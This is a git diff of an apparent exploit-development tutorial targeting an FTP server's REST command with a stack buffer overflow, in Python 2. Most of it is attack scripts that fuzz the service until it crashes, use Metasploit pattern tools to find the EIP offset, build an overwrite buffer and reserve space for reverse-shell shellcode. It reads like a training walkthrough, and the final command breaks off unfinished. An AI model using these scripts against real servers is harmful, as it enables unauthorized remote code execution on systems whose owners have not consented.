@@ -18,7 +18,7 @@ while(size < 500): #using a while loop to keep sending the buffer until it reach
       print "\nSending evil buffer with %s bytes" % size
     	buffer ="A" * size #defining the buffer as a bunch of As
     	s = socket(AF_INET,SOCK_STREAM)
-    	s.connect(("10.0.0.101",21)) #establishing connection
+    	s.connect(("ip",21)) #establishing connection
     	s.recv(2000)
     	s.send("USER test\r\n") #sending username
     	s.recv(2000)
@@ -27,7 +27,7 @@ while(size < 500): #using a while loop to keep sending the buffer until it reach
     	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
     	s.close() #closing the connection
     	s = socket(AF_INET,SOCK_STREAM)
-    	s.connect(("10.0.0.101",21)) #an additional connection is needed for the crash to occur
+    	s.connect(("ip",21)) #an additional connection is needed for the crash to occur
     	sleep(1) #waiting one second
     	s.close() #closing the connection
 
@@ -45,8 +45,8 @@ From this point we need to know which length of input buffer we must have.
 At this point we need to identify which part of the buffer that is being sent is landing in the EIP register, 
 in order to then modify it to control the execution flow of the program. Because all that was sent was a bunch of As, 
 at the moment there is no way to know what part has overwritten EIP. Command for creating offset: 
-msf-pattern_create -l [pattern length]
-Now script looks like this:
+msf-pattern_create -l pattern_length
+After this need to replace buffer value with generated offset. Now script looks like this:
 
 import errno
 from os import strerror
@@ -57,9 +57,9 @@ from struct import pack
 
 try:
 	print "\n[+] Sending evil buffer..."
-	buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9" #defining the buffer as a random pattern
+	buffer = "offset" #defining the buffer as a random pattern
 	s = socket(AF_INET,SOCK_STREAM)
-	s.connect(("10.0.0.101",21)) #establishing connection
+	s.connect(("ip",21)) #establishing connection
 	s.recv(2000)
 	s.send("USER test\r\n") #sending username
 	s.recv(2000)
@@ -68,7 +68,7 @@ try:
 	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
 	s.close()
 	s = socket(AF_INET,SOCK_STREAM)
-	s.connect(("10.0.0.101",21)) #an additional connection is needed for the crash to occur
+	s.connect(("ip",21)) #an additional connection is needed for the crash to occur
 	sleep(1) #waiting one second
 	s.close() #closing the connection
 	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
@@ -79,3 +79,83 @@ except: #if a connection can't be made, print an error and exit cleanly
 	print "[*]Error in connection with server"
 	sys.exit()
 
+After script executing we must see the EIP value in the debugging tool. With this value we can calculate the exact EIP offset using following command:
+msf-pattern_offset -l pattern_length -q EIP_address
+Now with this value need to change script on something like this:
+
+import errno
+from os import strerror
+from socket import *
+import sys
+from time import sleep
+from struct import pack
+
+try:
+	print "\n[+] Sending evil buffer..."
+	offset = "A" * length #defining the offset value
+        EIP = "B" * 4 #EIP placeholder
+        padding = "C" * (N - len(offset) - len(EIP)) #adding padding to keep the same buffer size of N bytes
+        buffer = offset + EIP + padding #assembling the buffer
+        s = socket(AF_INET,SOCK_STREAM)
+	s.connect(("ip",21)) #establishing connection
+	s.recv(2000)
+	s.send("USER test\r\n") #sending username
+	s.recv(2000)
+	s.send("PASS test\r\n") #sending password
+	s.recv(2000)
+	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
+	s.close()
+	s = socket(AF_INET,SOCK_STREAM)
+	s.connect(("ip",21)) #an additional connection is needed for the crash to occur
+	sleep(1) #waiting one second
+	s.close() #closing the connection
+	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
+	print "\n[+] Sending buffer: " + buffer
+	print "\n[+] Done!"
+
+except: #if a connection can't be made, print an error and exit cleanly
+	print "[*]Error in connection with server"
+	sys.exit()
+	
+3. FINDING AVAILABLE SHELLCODE SPACE
+
+A normal reverse shell payload is about 300-400 bytes. Modifying the script, adding about 550 C characters to the script in a new shellcode variable 
+and get something like this:
+
+import errno
+from os import strerror
+from socket import *
+import sys
+from time import sleep
+from struct import pack
+
+try:
+	print "\n[+] Sending evil buffer..."
+	offset = "A" * length #defining the offset value
+        EIP = "B" * 4 #EIP placeholder
+        shellcode = "C" * (N - (len(offset) -len(EIP))) #Shellcode placeholder using about 550 Cs
+        buffer = offset + EIP + shellcode #assembling the buffer 
+        s = socket(AF_INET,SOCK_STREAM)
+	s.connect(("ip",21)) #establishing connection
+	s.recv(2000)
+	s.send("USER test\r\n") #sending username
+	s.recv(2000)
+	s.send("PASS test\r\n") #sending password
+	s.recv(2000)
+	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
+	s.close()
+	s = socket(AF_INET,SOCK_STREAM)
+	s.connect(("ip",21)) #an additional connection is needed for the crash to occur
+	sleep(1) #waiting one second
+	s.close() #closing the connection
+	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
+	print "\n[+] Sending buffer: " + buffer
+	print "\n[+] Done!"
+
+except: #if a connection can't be made, print an error and exit cleanly
+	print "[*]Error in connection with server"
+	sys.exit()
+
+To calculate how many C characters made it into ESP, all we need to do is subtract the address where ESP starts to the one where the Cs end.
+For example, we can do it with python:
+python -c "0x029BFE0C - 0x029BFBE4
